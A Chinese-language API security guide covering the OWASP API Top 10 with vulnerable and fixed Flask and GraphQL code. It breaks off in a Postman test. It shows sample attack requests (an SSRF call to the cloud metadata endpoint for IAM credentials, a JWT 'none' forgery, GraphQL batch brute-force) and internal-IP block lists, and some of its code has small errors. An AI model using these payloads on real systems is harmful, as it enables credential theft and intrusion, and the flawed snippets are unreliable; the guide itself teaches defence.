# API安全完整指南

> 本文档系统化讲解API安全全生命周期，覆盖OWASP API Security Top 10 (2023)、REST/GraphQL安全实践、API测试工具链、网关与WAF防护，以及Python安全检测脚本。所有代码示例使用模拟数据，确保安全合规。

---

## 目录

1. [API安全概述](#1-api安全概述)
2. [OWASP API Security Top 10 (2023) 详解](#2-owasp-api-security-top-10-2023-详解)
3. [REST API安全实战](#3-rest-api安全实战)
4. [GraphQL安全](#4-graphql安全)
5. [API安全测试](#5-api安全测试)
6. [API网关与WAF](#6-api网关与waf)
7. [Python API安全测试脚本示例](#7-python-api安全测试脚本示例)

---

## 1. API安全概述

### 1.1 API安全重要性

API已成为现代应用架构的核心连接层，也是攻击者的首要目标：

```
攻击面扩大:
├── 微服务架构 → API端点数量激增（单个应用数十到数百个API）
├── 第三方集成 → 外部API暴露面扩大
├── 移动应用 → 移动端API调用无处不在
├── IoT设备 → 设备API暴露在互联网
└── AI模型 → 新型API（LLM API）引入新风险

数据泄露案例:
├── 2019: US Postal Service API泄露6000万用户数据（BOLA漏洞）
├── 2021: LinkedIn API scraping泄露7亿用户数据
├── 2022: Optus API暴露1000万用户数据（无认证端点）
└── 2023: 多起API Key泄露导致云资源被滥用
```

**API安全核心三要素：**

| 维度 | 目标 | 关键控制 |
|------|------|----------|
| 认证(Authentication) | 确认调用者身份 | JWT/OAuth2/API Key/MFA |
| 授权(Authorization) | 限制可访问资源 | RBAC/ABAC/BOLA防护 |
| 审计(Audit) | 记录所有操作 | 请求日志/行为分析/告警 |

### 1.2 RESTful API vs GraphQL vs gRPC 安全考量

| 特性 | RESTful API | GraphQL | gRPC |
|------|-------------|---------|------|
| 通信格式 | JSON/XML | JSON | Protobuf |
| 端点模式 | 多个固定端点 | 单端点灵活查询 | 多个服务方法 |
| 内省风险 | 低（需手动探索） | 高（内省查询暴露Schema） | 中（反射API可枚举） |
| 注入风险 | 参数注入 | 查询注入 | Protobuf类型安全 |
| 速率限制 | 易实现（按端点） | 囍难（单端点复杂查询） | 中等 |
| 批量攻击 | 需多请求 | 单请求批量查询（高风险） | 需多请求 |
| 认证方案 | JWT/OAuth2 | 同REST（Bearer Token） | Token/SSL/TLS |

### 1.3 API安全生命周期

```
设计阶段:
├── 威胁建模(STRIDE)
├── 最小权限原则
├── 数据分类分级
└── API契约设计(OpenAPI Spec)

开发阶段:
├── 安全编码规范
├── 输入验证与输出编码
├── 依赖安全扫描(SCA)
└── SAST静态分析

测试阶段:
├── DAST动态扫描
├── API模糊测试
├── 授权测试(BOLA/IDOR)
└── 渗透测试

部署阶段:
├── API网关防护
├── WAF规则部署
├── 速率限制配置
└── mTLS内部通信

运维阶段:
├── API资产盘点
├── 异常监控与告警
├── 定期安全评估
└── 版本废弃管理
```

---

## 2. OWASP API Security Top 10 (2023) 详解

### API1: Broken Object Level Authorization (BOLA) / IDOR

**原理：** API端点未正确验证用户对特定对象的访问权限，攻击者通过修改对象ID访问他人数据。

**攻击示例：**

```http
# 正常请求（用户123查看自己的订单）
GET /api/v1/orders/5001
Authorization: Bearer <user_123_token>

# 攻击请求（修改订单ID访问他人订单）
GET /api/v1/orders/5002
Authorization: Bearer <user_123_token>
# 服务端仅验证了token有效性，未验证user_123是否有权访问order/5002
```

**防御方案：**

```python
# 脆弱代码 - 仅依赖URL中的ID
@app.route('/api/v1/orders/<int:order_id>')
@jwt_required
def get_order(order_id):
    order = Order.query.get(order_id)  # 直接查ID，无归属检查
    return jsonify(order.to_dict())

# 安全代码 - 基于用户身份过滤
@app.route('/api/v1/orders/<int:order_id>')
@jwt_required
def get_order(order_id):
    current_user = get_jwt_identity()
    # 必须验证资源归属于当前用户
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user  # 归属校验
    ).first_or_404()
    return jsonify(order.to_dict())

# 推荐使用UUID替代自增ID（增加枚举难度）
# id = Column(UUID, primary_key=True, default=uuid4)
```

### API2: Broken Authentication

**原理：** 认证机制实现缺陷导致身份冒充、会话劫持或暴力破解。

**攻击示例：**

```http
# 暴力破解 - 无速率限制
POST /api/v1/auth/login
Content-Type: application/json

{"username": "admin", "password": "123456"}
# 攻击者可无限重试不同密码

# JWT弱签名 - 使用none算法
# 原始Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# 篡改后:    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
#                              ^^^ "none"算法，签名被移除
```

**防御方案：**

```python
import jwt
import hashlib
import secrets
from datetime import datetime, timedelta
from functools import wraps

# 安全的JWT生成与验证
class SecureJWT:
    SECRET_KEY = secrets.token_urlsafe(32)  # 强密钥
    ALGORITHM = "HS256"  # 固定算法，不允许none
    ACCESS_TOKEN_EXPIRE = timedelta(minutes=15)
    REFRESH_TOKEN_EXPIRE = timedelta(days=7)

    @classmethod
    def create_token(cls, user_id: str, claims: dict) -> str:
        payload = {
            "sub": user_id,
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + cls.ACCESS_TOKEN_EXPIRE,
            "jti": str(uuid.uuid4()),  # 唯一标识用于吊销
            **claims
        }
        return jwt.encode(payload, cls.SECRET_KEY, algorithm=cls.ALGORITHM)

    @classmethod
    def verify_token(cls, token: str) -> dict:
        try:
            # 明确指定算法，拒绝none和其他算法
            payload = jwt.decode(
                token,
                cls.SECRET_KEY,
                algorithms=[cls.ALGORITHM],  # 白名单
                options={
                    "verify_exp": True,
                    "verify_iat": True,
                    "verify_signature": True,  # 强制验证签名
                }
            )
            return payload
        except jwt.InvalidTokenError:
            raise AuthenticationError("Invalid token")


# 速率限制装饰器
def rate_limit(max_requests=5, window=60):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr
            key = f"rate:{ip}:{f.__name__}"
            current = redis.incr(key)
            if current == 1:
                redis.expire(key, window)
            if current > max_requests:
                return jsonify({"error": "Too many requests"}), 429
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/api/v1/auth/login', methods=['POST'])
@rate_limit(max_requests=5, window=60)  # 每分钟最多5次
def login():
    data = request.json
    user = User.query.filter_by(username=data['username']).first()
    # 使用恒定时间比较防时序攻击
    if user and secrets.compare_digest(user.password_hash,
                                       hash_password(data['password'])):
        token = SecureJWT.create_token(user.id, {"role": user.role})
        return jsonify({"access_token": token})
    # 无论用户是否存在，响应时间一致
    return jsonify({"error": "Invalid credentials"}), 401
```

### API3: Broken Object Property Level Authorization

**原理：** API返回了超出用户权限范围的属性（如密码哈希、内部ID），或接受用户不应修改的属性。

**攻击示例：**

```http
# 用户更新个人信息 - 尝试提权
PATCH /api/v1/users/me
Authorization: Bearer <user_token>
Content-Type: application/json

{
    "name": "John",
    "email": "john@example.com",
    "role": "admin",         ← 尝试修改role字段
    "is_verified": true,     ← 尝试自我验证
    "balance": 99999999      ← 尝试修改余额
}
```

**防御方案：**

```python
from pydantic import BaseModel
from typing import Optional

# 使用Schema明确允许的字段
class UserUpdateSchema(BaseModel):
    name: Optional[str]
    email: Optional[str]
    # 不包含role, is_verified, balance等敏感字段

@app.route('/api/v1/users/me', methods=['PATCH'])
@jwt_required
def update_profile():
    current_user = get_jwt_identity()
    # 使用Schema过滤，仅允许白名单字段
    data = UserUpdateSchema(**request.json)
    user = User.query.get(current_user)
    for field, value in data.dict(exclude_unset=True).items():
        setattr(user, field, value)
    db.session.commit()
    return jsonify(user.to_public_dict())  # 仅返回公开字段

# 模型定义中区分公开/私有字段
class User:
    PUBLIC_FIELDS = {'id', 'name', 'email'}
    PRIVATE_FIELDS = {'password_hash', 'role', 'balance', 'is_verified'}

    def to_public_dict(self):
        return {f: getattr(self, f) for f in self.PUBLIC_FIELDS}
```

### API4: Unrestricted Resource Consumption

**原理：** API未限制资源消耗，导致DoS或资源耗尽。

**攻击示例：**

```http
# 请求超大文件
GET /api/v1/export?format=csv&all_records=true
# 返回数百万条记录导致内存耗尽

# 无限制分页
GET /api/v1/users?page=1&page_size=999999999

# 复杂查询消耗CPU
POST /api/v1/graphql
{"query": "{ users { orders { items { reviews { user { orders { ... } } } } } } }"}
# 深度嵌套导致N+1查询和CPU耗尽
```

**防御方案：**

```python
from flask import Flask, request
from functools import wraps

# 分页限制
MAX_PAGE_SIZE = 100

@app.route('/api/v1/users')
@jwt_required
def list_users():
    page = min(int(request.args.get('page', 1)), 1000)
    page_size = min(int(request.args.get('page_size', 20)), MAX_PAGE_SIZE)
    pagination = User.query.paginate(page=page, per_page=page_size)
    return jsonify({
        "data": [u.to_public_dict() for u in pagination.items],
        "total": pagination.total,
        "page": page,
        "page_size": page_size
    })

# 请求体大小限制
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB

# 超时设置
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    'pool_timeout': 10,
    'pool_recycle': 3600,
}

# 速率限制（基于token维度）
@jwt_required
def get_user_from_token():
    user = get_jwt_identity()
    key = f"api_limit:{user}"
    count = redis.incr(key)
    if count == 1:
        redis.expire(key, 3600)  # 每小时1000次
    if count > 1000:
        return jsonify({"error": "Rate limit exceeded"}), 429
```

### API5: Broken Function Level Authorization (BFLA)

**原理：** 管理功能未正确授权，普通用户可执行管理操作。

**攻击示例：**

```http
# 普通用户尝试访问管理端点
DELETE /api/v1/admin/users/123
Authorization: Bearer <regular_user_token>

# 如果服务端仅检查token有效性而未检查角色权限
# → 普通用户可删除任意用户
```

**防御方案：**

```python
# 基于角色的访问控制
def require_role(*roles):
    def decorator(f):
        @wraps(f)
        @jwt_required
        def wrapped(*args, **kwargs):
            claims = get_jwt()
            user_role = claims.get('role', 'guest')
            if user_role not in roles:
                return jsonify({"error": "Forbidden"}), 403
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/api/v1/admin/users/<int:user_id>', methods=['DELETE'])
@require_role('admin', 'super_admin')
def delete_user(user_id):
    user = User.query.get_or_404(user_id)
    db.session.delete(user)
    db.session.commit()
    return '', 204

# 基于属性的访问控制(ABAC) - 更细粒度
def check_permission(user, action, resource):
    policy = {
        ('viewer', 'read', 'public_data'): True,
        ('editor', 'write', 'own_content'): user.id == resource.owner_id,
        ('admin', 'delete', 'any_user'): True,
    }
    return policy.get((user.role, action, resource.type), False)
```

### API6: Unrestricted Access to Sensitive Business Flows

**原理：** API关键业务流程（如购买、预约、评论）无频率限制，被自动化滥用。

**攻击示例：**

```http
# 抢购脚本 - 自动化并发请求
POST /api/v1/products/limited-edition/purchase
Authorization: Bearer <token>

# 预约挂号 - 批量占用名额
POST /api/v1/appointments
{"doctor_id": 123, "slot": "2024-03-20-09:00"}

# 评论灌水 - 自动批量发帖
POST /api/v1/comments
{"post_id": 456, "content": "广告内容..."}
```

**防御方案：**

```python
# 业务流程级别的频率限制
@app.route('/api/v1/products/<int:pid>/purchase', methods=['POST'])
@jwt_required
@rate_limit(max_requests=1, window=3600)  # 每用户每小时1次购买
def purchase_product(pid):
    # 验证码验证（关键操作）
    captcha = request.json.get('captcha')
    if not verify_captcha(captcha):
        return jsonify({"error": "Invalid captcha"}), 400

    # 人机验证
    if is_bot_request(request):
        return jsonify({"error": "Suspicious activity"}), 403

    product = Product.query.get_or_404(pid)
    if product.stock <= 0:
        return jsonify({"error": "Out of stock"}), 409
    # 使用乐观锁防超卖
    updated = Product.query.filter_by(id=pid, stock=product.stock).update(
        {'stock': product.stock - 1}
    )
    if not updated:
        return jsonify({"error": "Concurrent purchase, retry"}), 409
    db.session.commit()
    return jsonify({"status": "purchased"})

# CAPTCHA集成
from flask_captcha import Captcha
captcha = Captcha(app, config={
    'CAPTCHA_LENGTH': 6,
    'CAPTCHA_MODE': 'image',
    'CAPTCHA_EXPIRE': 300,  # 5分钟过期
})
```

### API7: SSRF (Server-Side Request Forgery)

**原理：** API接收URL参数并在服务端发起请求，攻击者利用此访问内部服务。

**攻击示例：**

```http
# 图片预览功能被利用
POST /api/v1/images/fetch
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# 访问AWS元数据端点窃取IAM凭据

# 内网扫描
POST /api/v1/webhook/test
{"url": "http://10.0.0.1:8080/admin"}
# 探测内部服务
```

**防御方案：**

```python
import ipaddress
import socket
from urllib.parse import urlparse

class SSRFProtector:
    BLOCKED_RANGES = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('169.254.0.0/16'),  # 链路本地
        ipaddress.ip_network('127.0.0.0/8'),      # 回环
        ipaddress.ip_network('0.0.0.0/8'),        # 未指定
    ]

    @classmethod
    def validate_url(cls, url: str) -> bool:
        parsed = urlparse(url)
        if parsed.scheme not in ('http', 'https'):
            return False
        hostname = parsed.hostname
        if not hostname:
            return False
        try:
            # 解析所有IP地址（防止DNS绑定）
            ips = socket.getaddrinfo(hostname, None)
            for ip_info in ips:
                ip = ipaddress.ip_address(ip_info[4][0])
                for blocked in cls.BLOCKED_RANGES:
                    if ip in blocked:
                        return False
        except socket.gaierror:
            return False
        return True

@app.route('/api/v1/images/fetch', methods=['POST'])
@jwt_required
def fetch_image():
    url = request.json.get('url')
    if not SSRFProtector.validate_url(url):
        return jsonify({"error": "URL not allowed"}), 400
    # 使用固定超时和重定向限制
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.content
```

### API8: Security Misconfiguration

**原理：** API配置不当暴露敏感信息或开放过多权限。

**攻击示例：**

```http
# 暴露的调试端点
GET /api/v1/debug/env    → 返回环境变量(含密钥)
GET /api/v1/health/detail → 返回数据库连接信息
GET /.well-known/openapi  → 暴露完整API Schema含内部端点

# CORS配置过于宽松
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Authorization
# 允许任意网站携带认证头跨域请求
```

**防御方案：**

```python
# 安全配置检查清单
SECURITY_CONFIG = {
    # 禁用调试模式
    'DEBUG': False,
    'ENV': 'production',
    # 安全响应头
    'SECURITY_HEADERS': {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Content-Security-Policy': "default-src 'self'",
        'Cache-Control': 'no-store',
    },
    # CORS白名单
    'CORS_ORIGINS': ['https://app.example.com'],
    # 禁用详细错误信息
    'PROPAGATE_EXCEPTIONS': False,
    # 禁用不必要的HTTP方法
    'ALLOWED_METHODS': ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
}

# 移除敏感信息
@app.errorhandler(500)
def internal_error(e):
    # 不暴露堆栈信息
    return jsonify({"error": "Internal server error"}), 500

# 定期配置扫描
def scan_api_config():
    checks = [
        ("Debug模式关闭", not app.debug),
        ("HTTPS强制", app.config.get('SSL_REDIRECT', False)),
        ("CORS白名单", app.config.get('CORS_ORIGINS') != ['*']),
        ("安全响应头", all(
            h in response.headers
            for h in ['X-Content-Type-Options', 'X-Frame-Options']
        )),
        ("错误信息脱敏", not app.config.get('PROPAGATE_EXCEPTIONS')),
    ]
    return checks
```

### API9: Improper Inventory Management

**原理：** 组织不了解自己暴露了哪些API，旧版本和测试端点成为攻击入口。

**攻击示例：**

```http
# 发现旧版API（已废弃但仍可访问）
GET /api/v0/users/all      ← 无认证的旧端点
GET /api/v1/users          ← 新端点需要认证
GET /api/v2/users          ← 最新版本

# 内部测试端点暴露
GET /api/internal/test/db-reset  ← 测试端点未移除
GET /api/v1/staging/config       ← 环境配置泄露
```

**防御方案：**

```yaml
# API资产管理 - OpenAPI规范示例
openapi: 3.0.3
info:
  title: User Management API
  version: 2.1.0
  description: |
    生产API清单
    - 所有/v2/端点为生产环境
    - /v1/端点已废弃，将于2024-06-01下线
    - /v0/端点已移除
  contact:
    email: api-security@example.com

paths:
  /api/v2/users:
    get:
      summary: 获取用户列表
      security:
        - bearerAuth: []
      parameters:
        - name: page
          in: query
          schema:
            type: integer
            maximum: 1000
        - name: page_size
          in: query
          schema:
            type: integer
            maximum: 100
      responses:
        '200':
          description: 成功
        '401':
          description: 未认证
        '403':
          description: 无权限
        '429':
          description: 请求过频

# API生命周期管理流程:
# 1. 注册：新API必须在API网关注册
# 2. 版本：遵循语义化版本，旧版设定下线日期
# 3. 监控：跟踪每个端点的调用量和异常
# 4. 废弃：提前30天通知 → 流量降为0 → 下线
# 5. 审计：季度盘点所有暴露的API端点
```

### API10: Unsafe Consumption of APIs

**原理：** 应用集成的第三方API被攻陷或存在漏洞，通过信任关系间接攻击。

**攻击示例：**

```http
# 第三方API被入侵，返回恶意数据
GET https://partner-api.example.com/userinfo/123
# 被篡改的响应:
{"user": {"name": "<script>alert('XSS')</script>", "id": "123"}}

# 如果应用直接渲染返回的name字段 → 存储型XSS

# 第三方API SSRF
POST /api/v1/integration/webhook
{"callback_url": "https://trusted-partner.com/webhook"}
# 攻击者注册仿冒域名 trusted-partner.com → SSRF
```

**防御方案：**

```python
# 第三方API响应验证
from pydantic import BaseModel, validator

class PartnerUserInfo(BaseModel):
    user_id: str
    name: str

    @validator('name')
    def sanitize_name(cls, v):
        # 输出编码 - 防止XSS
        import html
        return html.escape(v, quote=True)

    @validator('user_id')
    def validate_user_id(cls, v):
        if not v.isdigit() or len(v) > 20:
            raise ValueError("Invalid user ID")
        return v

# 调用第三方API时
def fetch_partner_data(user_id: str):
    response = requests.get(
        f"https://partner-api.example.com/userinfo/{user_id}",
        timeout=10,
        verify=True,  # 强制TLS证书验证
    )
    # 使用Schema验证响应
    data = PartnerUserInfo.parse_obj(response.json())
    return data

# 白名单第三方域名
TRUSTED_PARTNER_DOMAINS = {
    'partner-api.example.com',
    'payment-api.example.com',
}

def is_trusted_domain(url: str) -> bool:
    parsed = urlparse(url)
    return parsed.hostname in TRUSTED_PARTNER_DOMAINS
```

---

## 3. REST API安全实战

### 3.1 认证方案对比

| 方案 | 适用场景 | 优势 | 风险 |
|------|----------|------|------|
| API Key | 服务间调用 | 简单 | 泄露即完全暴露 |
| JWT | 前后端分离 | 无状态、自包含 | 撤销困难、载荷可见 |
| OAuth 2.0 | 第三方授权 | 标准化、委托访问 | 配置复杂 |
| mTLS | 零信任内部 | 双向认证、最高安全 | 证书管理成本高 |

**JWT安全最佳实践：**

```
JWT安全检查项:
[✓] 使用强签名密钥（256位+，密钥轮换）
[✓] 固定算法（白名单），拒绝"none"
[✓] 短过期时间（Access Token 15分钟）
[✓] Refresh Token轮换（一次性使用）
[✓] 实现Token吊销（Redis黑名单 + jti）
[✓] 不在Payload存敏感数据（Base64可解码）
[✓] 使用HTTPS传输
[✓] HttpOnly + Secure Cookie存储
[✗] 不要在URL中传递Token
[✗] 不要长期有效的Access Token
```

### 3.2 授权与访问控制

```python
# RBAC + ABAC混合模型
class PermissionChecker:
    """基于角色和属性的访问控制"""

    ROLE_PERMISSIONS = {
        'admin': {'users:read', 'users:write', 'users:delete',
                  'config:read', 'config:write'},
        'manager': {'users:read', 'users:write', 'reports:read'},
        'user': {'profile:read', 'profile:write:own'},
        'guest': {'public:read'},
    }

    @classmethod
    def can(cls, user_role: str, action: str,
            resource_owner_id: str = None, current_user_id: str = None) -> bool:
        # RBAC检查
        permissions = cls.ROLE_PERMISSIONS.get(user_role, set())
        if action not in permissions:
            return False

        # ABAC补充检查（own后缀表示仅自己的资源）
        if action.endswith(':own'):
            return resource_owner_id == current_user_id

        return True

# 使用示例
@app.route('/api/v2/users/<int:user_id>', methods=['PUT'])
@jwt_required
def update_user(user_id):
    current_user_id = get_jwt_identity()
    current_user_role = get_jwt().get('role')

    target_user = User.query.get_or_404(user_id)

    if not PermissionChecker.can(
        current_user_role, 'profile:write:own',
        resource_owner_id=str(target_user.id),
        current_user_id=str(current_user_id)
    ):
        if not PermissionChecker.can(current_user_role, 'users:write'):
            return jsonify({"error": "Forbidden"}), 403
    # ... 执行更新
```

### 3.3 输入验证与输出编码

```python
from pydantic import BaseModel, validator, constr
import html

# 严格输入验证
class CreateUserSchema(BaseModel):
    username: constr(min_length=3, max_length=30,
                     pattern=r'^[a-zA-Z0-9_]+$')
    email: constr(pattern=r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
    password: constr(min_length=12, max_length=128)
    age: int

    @validator('username')
    def validate_username(cls, v):
        BLOCKED_USERNAMES = {'admin', 'root', 'system', 'null', 'undefined'}
        if v.lower() in BLOCKED_USERNAMES:
            raise ValueError("Username not allowed")
        return v

# SQL注入防护 - 参数化查询
from sqlalchemy import text

# 脆弱代码
# query = f"SELECT * FROM users WHERE name = '{name}'"  # 危险!

# 安全代码
users = db.session.execute(
    text("SELECT * FROM users WHERE name = :name AND status = :status"),
    {"name": name, "status": "active"}
).fetchall()

# XSS防护 - 输出编码
def safe_render(data: str) -> str:
    """对输出到HTML的数据进行编码"""
    return html.escape(data, quote=True)

# JSON API响应天然防XSS（Content-Type: application/json）
# 但需注意JSON响应中嵌入HTML的场景
```

### 3.4 速率限制与配额管理

```python
# 多维度速率限制
class RateLimiter:
    """多层级速率限制"""

    LIMITS = {
        # 级别: (请求数, 时间窗口秒)
        'per_ip':        (100, 60),      # 每IP每分钟100次
        'per_user':      (1000, 3600),    # 每用户每小时1000次
        'per_endpoint':  (50, 60),       # 每端点每分钟50次
        'per_sensitive': (5, 60),        # 敏感操作每分钟5次
    }

    @classmethod
    def check(cls, key: str, limit_type: str) -> bool:
        max_requests, window = cls.LIMITS[limit_type]
        redis_key = f"rl:{limit_type}:{key}"
        current = redis.incr(redis_key)
        if current == 1:
            redis.expire(redis_key, window)
        return current <= max_requests

# 滑动窗口速率限制（更精确）
def sliding_window_rate(key: str, limit: int, window: int) -> bool:
    """滑动窗口算法"""
    now = time.time()
    pipe = redis.pipeline()
    # 移除窗口外的记录
    pipe.zremrangebyscore(key, 0, now - window)
    # 添加当前请求
    pipe.zadd(key, {str(now): now})
    # 统计窗口内请求数
    pipe.zcard(key)
    pipe.expire(key, window)
    _, _, count = pipe.execute()
    return count <= limit

# 速率限制响应头
@app.after_request
def add_rate_limit_headers(response):
    user = get_jwt_identity() if request.endpoint else 'anonymous'
    remaining = redis.get(f"rl:per_user:{user}") or 0
    response.headers['X-RateLimit-Limit'] = '1000'
    response.headers['X-RateLimit-Remaining'] = str(1000 - int(remaining))
    response.headers['X-RateLimit-Reset'] = str(int(time.time()) + 3600)
    return response
```

### 3.5 API版本管理与废弃

```python
# API版本管理策略
"""
版本策略:
├── URI版本: /api/v1/users, /api/v2/users（推荐，最清晰）
├── Header版本: Accept: application/vnd.api.v2+json
├── 查询参数: /api/users?version=2
└── 内容协商: Accept Header（REST标准）

废弃流程:
1. 新版本上线 → v1标记为deprecated
2. 响应头: Deprecation: true
           Sunset: Sat, 31 Aug 2024 00:00:00 GMT
3. 30天通知期
4. 流量监控 → v1流量降为0
5. 下线v1
"""

@app.route('/api/v1/users/<int:user_id>')
@deprecated_version('v1', sunset_date='2024-08-31')
def get_user_v1(user_id):
    """v1 API - 已废弃"""
    response = make_response(jsonify({"id": user_id, "name": "User"}))
    response.headers['Deprecation'] = 'true'
    response.headers['Sunset'] = 'Sat, 31 Aug 2024 00:00:00 GMT'
    response.headers['Link'] = '</api/v2/users/{user_id}>; rel="successor-version"'
    return response

def deprecated_version(version, sunset_date):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            response = make_response(f(*args, **kwargs))
            response.headers['Deprecation'] = 'true'
            response.headers['Sunset'] = sunset_date
            # 日志记录旧版使用情况
            log.warning(f"Deprecated API {version} called by "
                        f"{get_jwt_identity() if request else 'anon'}")
            return response
        return wrapped
    return decorator
```

---

## 4. GraphQL安全

### 4.1 内省攻击与防护

```graphql
# 内省查询 - 暴露完整Schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
      }
    }
  }
}

# 攻击者可获取:
# - 所有Type定义
# - 所有Query/Mutation入口
# - 字段类型和关系
# - 内部数据模型（可能暴露隐藏端点）
```

**防护方案：**

```python
from graphql import parse, validate
from graphql.language.ast import IntrospectionQuery

# 生产环境禁用内省
def disable_introspection(query):
    """检测并阻止内省查询"""
    try:
        document = parse(query)
        for node in document.definitions:
            if isinstance(node, IntrospectionQuery):
                raise Exception("Introspection disabled in production")
    except Exception:
        return False
    return True

# Flask-GraphQL配置
app.add_url_rule(
    '/graphql',
    view_func=GraphQLView.as_view(
        'graphql',
        schema=schema,
        graphiql=False,  # 生产环境关闭IDE
        introspection=False,  # 关闭内省
    )
)

# 按角色控制内省权限
def conditional_introspection(query, user_role):
    if user_role == 'developer':
        return True  # 开发者可内省
    return disable_introspection(query)
```

### 4.2 批量查询攻击

```graphql
# 批量查询 - 单请求发送多个查询
[
  {"query": "mutation { login(username:\"admin\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(username:\"admin\", password:\"pass2\") { token } }"},
  {"query": "mutation { login(username:\"admin\", password:\"pass3\") { token } }"},
  # ... 数千个查询
  # 单请求绕过速率限制，实现批量暴力破解
]

# 别名攻击 - 利用别名批量请求
{
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
  # ...
  a10000: user(id: 10000) { email }
  # 单查询枚举所有用户
}
```

**防护方案：**

```python
# 查询复杂度分析
from graphql.analysis import QueryComplexityAnalyzer

class ComplexityValidator:
    MAX_DEPTH = 7        # 最大查询深度
    MAX_COMPLEXITY = 1000 # 最大复杂度
    MAX_ALIASES = 10     # 最大别名数

    @classmethod
    def validate(cls, query: str) -> tuple[bool, str]:
        document = parse(query)

        # 深度检查
        depth = cls._calculate_depth(document)
        if depth > cls.MAX_DEPTH:
            return False, f"Query depth {depth} exceeds max {cls.MAX_DEPTH}"

        # 复杂度检查
        complexity = cls._calculate_complexity(document)
        if complexity > cls.MAX_COMPLEXITY:
            return False, f"Complexity {complexity} exceeds max {cls.MAX_COMPLEXITY}"

        # 别名数量检查
        alias_count = cls._count_aliases(document)
        if alias_count > cls.MAX_ALIASES:
            return False, f"Aliases {alias_count} exceeds max {cls.MAX_ALIASES}"

        return True, "OK"

    @staticmethod
    def _calculate_depth(node, current_depth=0):
        max_depth = current_depth
        if hasattr(node, 'selection_set') and node.selection_set:
            for selection in node.selection_set.selections:
                max_depth = max(max_depth,
                               ComplexityValidator._calculate_depth(
                                   selection, current_depth + 1))
        return max_depth

    @staticmethod
    def _count_aliases(document):
        count = 0
        for definition in document.definitions:
            if hasattr(definition, 'selection_set'):
                for field in definition.selection_set.selections:
                    if field.alias:
                        count += 1
        return count

# 在GraphQL中间件中使用
@app.route('/graphql', methods=['POST'])
def graphql_endpoint():
    query = request.json.get('query', '')
    valid, message = ComplexityValidator.validate(query)
    if not valid:
        return jsonify({"errors": [{"message": message}]}), 400
    # ... 执行查询
```

### 4.3 深度嵌套攻击

```graphql
# 递归深度嵌套 - 导致无限递归或资源耗尽
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              # ... 无限嵌套
              # N层嵌套 = N^关系数 次数据库查询
            }
          }
        }
      }
    }
  }
}

# 如果User.friends返回User列表
# 深度5 → 每层N个朋友 → N^5次查询
```

**防护方案：**

```python
# 查询深度限制中间件
from graphql import GraphQLObjectType

def depth_limit_validator(max_depth=7):
    """GraphQL深度限制中间件"""
    def middleware(next_, root, info, **args):
        context = info.context
        if not hasattr(context, '_depth'):
            context._depth = 0
        context._depth += 1
        if context._depth > max_depth:
            raise Exception(f"Query depth exceeds limit of {max_depth}")
        result = next_(root, info, **args)
        context._depth -= 1
        return result
    return middleware

# 成本分析器 - 为每个字段分配成本
FIELD_COSTS = {
    'user': 1,
    'users': 10,      # 列表查询成本高
    'friends': 5,
    'orders': 3,
    'search': 50,     # 搜索成本最高
}

class CostAnalyzer:
    MAX_COST = 1000

    @classmethod
    def calculate_cost(cls, document) -> int:
        total = 0
        for definition in document.definitions:
            if hasattr(definition, 'selection_set'):
                total += cls._selection_cost(definition.selection_set)
        return total

    @classmethod
    def _selection_cost(cls, selection_set, multiplier=1) -> int:
        cost = 0
        for field in selection_set.selections:
            field_name = field.name.value
            field_cost = FIELD_COSTS.get(field_name, 1)
            cost += field_cost * multiplier
            if hasattr(field, 'selection_set') and field.selection_set:
                cost += cls._selection_cost(
                    field.selection_set, multiplier * field_cost)
        return cost
```

### 4.4 GraphQL认证与授权

```python
# GraphQL字段级授权
from graphene import ObjectType, String, List, Field

class UserType(ObjectType):
    id = String()
    name = String()
    email = String()
    role = String()
    salary = String()  # 敏感字段
    api_key = String()  # 极敏感字段

    # 字段级授权
    @staticmethod
    def resolve_email(parent, info):
        user = info.context.get('user')
        if not user:
            raise Exception("Authentication required")
        # 仅自己或管理员可查看email
        if user.id != parent.id and user.role != 'admin':
            raise Exception("Not authorized to view email")
        return parent.email

    @staticmethod
    def resolve_salary(parent, info):
        user = info.context.get('user')
        # 仅HR和管理员可查看薪资
        if not user or user.role not in ('hr', 'admin'):
            raise Exception("Not authorized")
        return parent.salary

    @staticmethod
    def resolve_api_key(parent, info):
        # 永远不通过GraphQL暴露
        raise Exception("Field not accessible")

# 查询级授权
class Query(ObjectType):
    users = List(UserType)
    user = Field(UserType, id=String(required=True))

    @staticmethod
    def resolve_users(root, info):
        user = info.context.get('user')
        if not user or user.role not in ('admin', 'hr'):
            raise Exception("Admin access required")
        return User.query.all()

    @staticmethod
    def resolve_user(root, info, id):
        user = info.context.get('user')
        if not user:
            raise Exception("Authentication required")
        target = User.query.get(id)
        # BOLA防护
        if user.id != int(id) and user.role not in ('admin', 'hr'):
            raise Exception("Not authorized")
        return target
```

---

## 5. API安全测试

### 5.1 Postman/Newman API安全测试

```javascript
// Postman测试脚本 - BOLA检测
// 在Tests标签页中编写

pm.test("BOLA检测 - 尝试访问其他用户资源", function () {
    // 获取当前用户token
    const userToken = pm.environment.get("user_token");
